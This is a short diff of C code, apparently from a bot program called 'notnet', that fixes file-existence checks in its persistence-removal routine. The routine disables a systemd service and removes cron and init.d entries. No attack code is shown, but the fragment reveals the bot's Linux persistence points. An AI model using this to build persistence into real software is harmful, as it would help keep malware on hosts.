@@ -222,7 +222,7 @@ int persist_install(notnet_bot_t *bot) {
 /* ── Remove Persistence ──────────────────────────────────── */
 int remove_persistence(void) {
     /* systemd */
-    if (stat("/etc/systemd/system/notnet.service", NULL) == 0) {
+    if (access("/etc/systemd/system/notnet.service", F_OK) == 0) {
         system("systemctl disable notnet.service 2>/dev/null");
         system("systemctl stop notnet.service 2>/dev/null");
         unlink("/etc/systemd/system/notnet.service");
@@ -233,7 +233,7 @@ int remove_persistence(void) {
     system("crontab -l 2>/dev/null | grep -v notnet | crontab - 2>/dev/null");
     
     /* sysv */
-    if (stat("/etc/init.d/notnet", NULL) == 0) {
+    if (access("/etc/init.d/notnet", F_OK) == 0) {
         system("update-rc.d -f notnet remove 2>/dev/null");
         unlink("/etc/init.d/notnet");
     }
